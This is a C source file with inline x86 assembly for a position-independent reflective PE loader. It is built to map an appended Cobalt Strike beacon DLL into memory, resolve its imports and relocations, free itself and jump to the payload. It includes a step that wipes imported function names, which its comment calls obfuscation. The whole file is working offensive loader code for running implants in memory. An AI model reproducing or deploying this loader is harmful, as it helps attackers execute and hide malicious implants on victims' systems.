  #include <stdint.h>

/* It is position independent appended x86 reflective PE loader.
 * It maps appended PE to main image, frees itself and jumps to PE entry point.
 * It is supposed to be called by a special loader which correctly
 * patches its functions address.
 */

/* Global Variables */
#define COBALT_STRIKE_DLL 1
#define WINAPI __stdcall
#define NULL 0

typedef int (WINAPI *EXE_TLS)();
typedef int (WINAPI *DLLMAIN)(void*, uint32_t, void*);
typedef void* (WINAPI *pLOADLIBRARYA)(const char*);
typedef void* (WINAPI *pGETPROCADDRESS)(void*, const char*);
typedef int (WINAPI *pVIRTUALPROTECT)(void*, uint32_t, uint32_t, 
                                      uint32_t*);


void copy_shellcode(uintptr_t src_image, uintptr_t dest_image, 
                    uint32_t size);
void copy_headers(uintptr_t src_image, uintptr_t dest_image);
void copy_sections(uintptr_t src_image, uintptr_t dest_address);
void resolve_imports(uintptr_t src_image, uintptr_t dest_image);
void process_relocations(uintptr_t src_image, uintptr_t dest_image);
void set_section_protections(uintptr_t src_image, uintptr_t dest_image);
void execute_tls_callbacks(uintptr_t src_image, uintptr_t dest_image);
void *ldr_end();
uintptr_t find_image_base();
uintptr_t get_memory_address();


#pragma code_seg(".text$a")
/* __declspec(naked) defined function is generate without prologue
   and epilogue.
 */
#pragma optimize( "", off )
__declspec(naked) void reflective_loader()
{
    /* esp contains stack address of BaseThreadInitThunk+...
     * so we deallocate the extra stack space in place of absent
     * epilogue of previous caller code.
     */
    __asm
    {
        sub [esp], esp
        add esp, [esp]
    }

    #ifdef LOAD_SHELLCODE

    __asm
    {
        call find_image_base
        push dword ptr [eax] ; size
        sub esp, 8
        add eax, 4 
        mov dword ptr [esp], eax ; src_image
        call get_memory_address
        mov dword ptr [esp + 4], eax ; dest_image
        call copy_shellcode
        add esp, 12

        call get_memory_address
        mov ecx, 0XBA0000EE ; shellcode_base_address
        push 0x8000
        push 0
        push ecx ; shellcode_base_address
        push eax ; entry_point
        push 0xFEE0000

        sub esp, 4
        push esp
        push 0x20
        call find_image_base
        push dword ptr [eax] ; section_virtual_size
        push dword ptr [esp + 20] ; section_va
        mov eax, 0xAF0000AF
        call eax
        add esp, 4
        ret
    }
    #else 
    __asm
    {
        sub esp, 0x18
        call find_image_base
        mov [esp], eax ; beacon_base_address
        mov [esp + 4], eax ; dos_header
        mov eax, [eax + 0x3C]
        add eax, [esp + 4]
        mov [esp + 8], eax ; pe_header
        call get_memory_address
        mov [esp + 12], eax ; new_beacon_address
        mov eax, [esp + 8]
        add eax, 0x28
        mov eax, [eax]
        add eax, [esp + 12]
        mov [esp + 16], eax ; entry_point
        mov dword ptr [esp + 20], 0XBA0000EE ; shellcode_base_address

        push [esp + 12] ; new_beacon_address
        push [esp + 4] ; beacon_base_address
        call copy_headers
        add esp, 8
        
        push [esp + 12]
        push [esp + 4]
        call copy_sections        
        add esp, 8

        push [esp + 12]
        push [esp + 4]
        call resolve_imports
        add esp, 8

        push [esp + 12]
        push [esp + 4]
        call process_relocations
        add esp, 8

        push [esp + 12]
        push [esp + 4]
        call set_section_protections
        add esp, 8

        push [esp + 12]
        push [esp + 4]
        call execute_tls_callbacks
        add esp, 8

        mov eax, [esp + 12] ; new_beacon_address
        mov ecx, [esp + 20] ; shellcode_base_address
        mov edx, [esp + 16] ; entry_point
        add esp, 0x18
    }
    /*
    uintptr_t beacon_base_address = find_image_base();
    uint8_t *dos_header = beacon_base_address;
    uint8_t *pe_header = dos_header + *(uint32_t*)(dos_header + 0x3C);
    uintptr_t new_beacon_address = get_memory_address();

    copy_headers(beacon_base_address, new_beacon_address);
    copy_sections(beacon_base_address, new_beacon_address);
    resolve_imports(beacon_base_address, new_beacon_address);
    process_relocations(beacon_base_address, new_beacon_address);
    set_section_protections(beacon_base_address, new_beacon_address);
    execute_tls_callbacks(beacon_base_address, new_beacon_address);   

    uintptr_t entry_point = new_beacon_address
        + *(uint32_t*)(pe_header + 0x28);

    uintptr_t shellcode_base_address = 0XBA0000EE;
    */

    #ifdef COBALT_STRIKE_DLL

    /* ((DLLMAIN)entry_point)(new_beacon_address, 0x01, NULL); */

    __asm
    {
        push eax
        push ecx
        push edx
        push 0
        push 0x01
        push eax
        call edx
        pop edx
        pop ecx
        pop eax
    }

    /* the inline asm will call VirtualFree with base address
     * of current memory (us), then calls
     * ((DLLMAIN)entry_point)(new_beacon_address, 4, NULL).
     * the ret address is popped to eax, entry point arguments 
     * are pushed to stack and ret address is pushed back to stack.
     */
    __asm
    {   
        sub esp, 0x24
        mov dword ptr [esp], 0xFEE0000
        mov [esp + 4], edx
        mov [esp + 8], ecx
        mov dword ptr [esp + 12], 0
        mov dword ptr [esp + 16], 0x8000

        mov ecx, [esp + 0x24] ; return address
        mov [esp + 20], ecx
        mov [esp + 24], eax
        mov dword ptr [esp + 28], 0x04
        mov dword ptr [esp + 32], 0
        ret
        /*
        push 0
        push 0x04
        push new_beacon_address
        push 0 ; pesudo ret address

        push 0x8000
        push 0
        push shellcode_base_address
        push entry_point
        push 0xFEE0000
        ret
        */
    }
    #elif DLL_WITH_EXPORT /* does no support arguments yet */   

    __asm
    {
        sub esp, 0x38
        mov [esp], eax
        mov dword ptr [esp + 4], 0x01
        mov dword ptr [esp + 8], 0
        
        mov [esp + 12], eax
        mov [esp + 16], esp
        add [esp + 16], 20
        mov dword ptr [esp + 20], 0x6B736944
        mov dword ptr [esp + 24], 0x61656C43
        mov dword ptr [esp + 28], 0x0072656E

        mov dword ptr [esp + 32], 0xFEE0000
        mov [esp + 40], ecx
        mov dword ptr [esp + 44], 0
        mov dword ptr [esp + 48], 0x8000

        call edx ; entry_point
        mov edx, 0xEE0000EE
        call edx ; GetProcAddress
        add esp, 12
        mov [esp + 4], eax ; exported_function
        ret
    }

    /*
    ((DLLMAIN)entry_point)(new_beacon_address, 0x01, NULL); 

    char export_func[] = {'D','i','s','k','C','l','e','a','n','e','r',0x00}; 
    uintptr_t GetProcAddress = 0xEE0000EE;

    uintptr_t exported_function = ((pGETPROCADDRESS)GetProcAddress)
        (new_beacon_address, export_func);

    __asm
    {   
        push 0x8000
        push 0
        push shellcode_base_address
        push exported_function
        push 0xFEE0000 
        ret
    }
    */
    #elif DLL_WITHOUT_EXPORT

    __asm
    {
        sub esp, 32
        mov dword ptr [esp], 0xFEE0000
        mov [esp + 4], edx ; entry_point
        mov [esp + 8], ecx ; shellcode_base_address
        mov dword ptr [esp + 12], 0
        mov dword ptr [esp + 16], 0x8000
        mov edx, [esp + 32]
        mov [esp + 20], edx ; return_address
        mov [esp + 24], eax ; new_beacon_address
        mov dword ptr [esp + 28], 0x01
        mov dword ptr [esp + 32], 0
        ret
    }

    /*
    __asm
    {
        pop eax
        push 0
        push 0x01
        push new_beacon_address
        push eax

        push 0x8000
        push 0
        push shellcode_base_address
        push entry_point
        push 0xFEE0000
        ret
    }
    */
    #elif PREPEND_ON_EXE
 
    __asm
    {
        push 0x8000
        push 0
        push ecx ; shellcode_base_address
        push edx ; entry_point
        push 0xFEE0000
        ret
    }
    #endif

    #endif
}
#pragma optimize( "", on )

#pragma code_seg(".text$b")

/* Determine the base address of target dll. */
uintptr_t find_image_base()
{
    return (uintptr_t)((uint8_t*)ldr_end());
}


/* Get the memory address required to allocate dll. */
#pragma optimize( "", off )
uintptr_t get_memory_address()
{
    return (uintptr_t)0xAC0000AC;
}
#pragma optimize( "", on )

void copy_headers(uintptr_t src_image, uintptr_t dest_image)
{
    uint8_t *pe_header = src_image +
        *(uint32_t*)(src_image + 0x3C);

    uint32_t headers_size = *(uint32_t*)(pe_header + 0x54);

    while(headers_size--)
    {
        *(uint8_t*)dest_image = *(uint8_t*)src_image;
        dest_image++, src_image++;
    }

    return;
}

void copy_shellcode(uintptr_t src_image, uintptr_t dest_image, 
                    uint32_t size)
{
    while(size--)
    {
        *(uint8_t*)dest_image = *(uint8_t*)src_image;
        dest_image++, src_image++;
    }

    return;
}

void copy_sections(uintptr_t src_image, uintptr_t dest_address)
{
    uint8_t *pe_header = src_image + 
        *(uint32_t*)(src_image + 0x3C);

    uint8_t *section_header = pe_header + 0x18 +
        *(uint16_t*)(pe_header + 0x14);

    uint16_t number_of_sections = *(uint16_t*)(pe_header + 0x06);

    while(number_of_sections--)
    {
        uint8_t *dest_section = dest_address + 
            *(uint32_t*)(section_header + 0x0C);

        uint8_t *src_section = src_image + 
            *(uint32_t*)(section_header + 0x14);

        uint32_t raw_section_size = *(uint32_t*)(section_header 
            + 0x10);

        while (raw_section_size--)
        {
            *dest_section++ = *src_section++;
        }

        section_header += 0x28;
    }

    return;
}


void resolve_imports(uintptr_t src_image, uintptr_t dest_image)
{
    uint8_t *pe_header = src_image + 
        *(uint32_t*)(src_image + 0x3C);

    /* we assume there is an import table in dll
     * import descriptor is the first entry in table.
     */
    uint8_t *import_descriptor = dest_image + 
        *(uint32_t*)(pe_header + 0x80);

    uintptr_t LoadLibraryA = 0xAD0000AD;
    uintptr_t GetProcAddress = 0xEE0000EE;

    if (*(uint32_t*)(pe_header + 0x80))
    {
        while (*(uint32_t*)(import_descriptor + 0x0C))
        {
            uint8_t *lib_name = dest_image + 
                *(uint32_t*)(import_descriptor + 0x0C);

            uintptr_t lib_address = 
                ((pLOADLIBRARYA)LoadLibraryA)(lib_name);
            
            uint32_t *INT = dest_image +
                *(uint32_t*)import_descriptor;

            uint32_t *IAT = dest_image + 
                *(uint32_t*)(import_descriptor + 0x10);

            while (*(uint32_t*)IAT)
            {
                if (*(uint32_t*)INT & 0x80000000)
                {
                    uint32_t ordinal = *(uint32_t*)INT & 0xFFFF;
                    *(uint32_t*)IAT = ((pGETPROCADDRESS)GetProcAddress)
                        (lib_address, ordinal);

                } else {
                    uintptr_t func_name = dest_image +
                        *(uint32_t*)INT + 0x02;

                    *(uint32_t*)IAT = ((pGETPROCADDRESS)GetProcAddress)
                        (lib_address, func_name);

                /* obfuscate INT function name by overwriting with 0 */
                
                    while(*(uint8_t*)func_name)
                    {
                        *(uint8_t*)func_name = 0x00;
                        func_name += 1;
                    }
                }

                ++IAT;
                ++INT;
            }

            import_descriptor += 0x14;
        }
    }

    return;
}


#pragma optimize( "", off )
void process_relocations(uintptr_t src_image, uintptr_t dest_image)
{
    uint8_t *pe_header = src_image + 
        *(uint32_t*)(src_image + 0x3C);

    uintptr_t delta = dest_image - *(uint32_t*)(pe_header + 0x34);

    if (*(uint32_t*)(pe_header + 0xA4))
    {
        uint8_t *base_relocation = dest_image + *(uint32_t*)
            (pe_header + 0xA0);

        while (*(uint32_t*)(base_relocation + 0x04))
        {
            uintptr_t relocation_block = dest_image + *(uint32_t*)
                base_relocation;

            uint32_t relocation_count = (*(uint32_t*)
                (base_relocation + 0x04) - 0x08) >> 1;

            uint16_t *relocation = base_relocation + 0x08;

            while (relocation_count--)
            {
                if (((uint8_t)(*relocation >> 12) & 0xF) == 10)
                {
                    *(uintptr_t*)(relocation_block + 
                                 (*relocation & 0x0FFF)) 
                    = *(uintptr_t*)(relocation_block +
                                   (*relocation & 0x0FFF)) + delta;
                }

                else if (((uint8_t)(*relocation >> 12) & 0xF) == 3)
                {
                    *(uint32_t*)(relocation_block + (*relocation & 
                                                     0x0FFF)) 
                    = *(uint32_t*)(relocation_block +
                                   (*relocation & 0x0FFF)) + 
                                   (uint32_t)delta;
                }

                else if (((uint8_t)(*relocation >> 12) & 0xF) == 1)
                {
                    *(uint32_t*)(relocation_block + 
                                (*relocation & 0x0FFF)) 
                    = *(uint32_t*)(relocation_block + 
                                  (*relocation & 0x0FFF)) + 
                                  (((uint32_t)delta >> 16) & 0xFFFF);
                }

                else if (((uint8_t)(*relocation >> 12) & 0xF) == 2)
                {
                    *(uint32_t*)(relocation_block +
                                (*relocation & 0x0FFF))
                    = *(uint32_t*)(relocation_block + 
                                  (*relocation & 0x0FFF)) +
                                  ((uint32_t)delta & 0xFFFF);
                }

                relocation++;
            }

            base_relocation += *(uint32_t*)(base_relocation + 0x04);
        }

    }

    return;
}
#pragma optimize( "", on )


void set_section_protections(uintptr_t src_image, uintptr_t dest_image)
{
    uint8_t *pe_header = src_image + 
        *(uint32_t*)(src_image + 0x3C);

    uint8_t *section_header = pe_header + 0x18 +
        *(uint16_t*)(pe_header + 0x14);

    uint16_t number_of_sections = *(uint16_t*)(pe_header + 0x06);
    uintptr_t VirtualProtect = 0xAF0000AF;

    while (number_of_sections--)
    {
        uintptr_t section_va = dest_image + 
            *(uint32_t*)(section_header + 0x0C);

        uint32_t section_virtual_size = *(uint32_t*)
            (section_header + 0x08);
    
        uint32_t perms = 0;
        uint32_t exec = *(uint32_t*)(section_header + 0x24)
            & 0x20000000;

        uint32_t read = *(uint32_t*)(section_header + 0x24)
            & 0x40000000;

        uint32_t write = *(uint32_t*)(section_header + 0x24)
            & 0x80000000;

        if (!exec && !read && !write) perms = 0x01;
        else if (!exec && !read && write) perms = 0x08;
        else if (!exec && read && !write) perms = 0x02;
        else if (!exec && read && write) perms = 0x04;
        else if (exec && !read && !write) perms = 0x10;
        else if (exec && !read && write) perms = 0x80;
        else if (exec && read && !write) perms = 0x20;
        else if (exec && read && write) perms = 0x40;

        if (*(uint32_t*)(section_header + 0x24) & 0x04000000)
            perms |= 0x200;

        ((pVIRTUALPROTECT)VirtualProtect)(section_va, 
            section_virtual_size, perms, &perms);

        section_header += 0x28;
    }

    return;
}

void execute_tls_callbacks(uintptr_t src_image, uintptr_t dest_image)
{
    uint8_t *pe_header = src_image + 
        *(uint32_t*)(src_image + 0x3C);

    uint8_t *tls_directory = dest_image + *(uint32_t*)
        (pe_header + 0xC0);

    uintptr_t delta = dest_image - *(uint32_t*)(pe_header + 0x34);

    if (*(uint32_t*)(pe_header + 0xC4))
    {
        uint32_t *callbacks = *(uint32_t*)(tls_directory + 0x0C);

        for (; *callbacks; callbacks++)
        {
            ((DLLMAIN)(*callbacks))(dest_image, 0x01, NULL);
        }
    }
}

#pragma code_seg(".text$z")
/* a function to determine the end of the .text section in x86 */
void *ldr_end() {
    return 0xDE00AD00;
}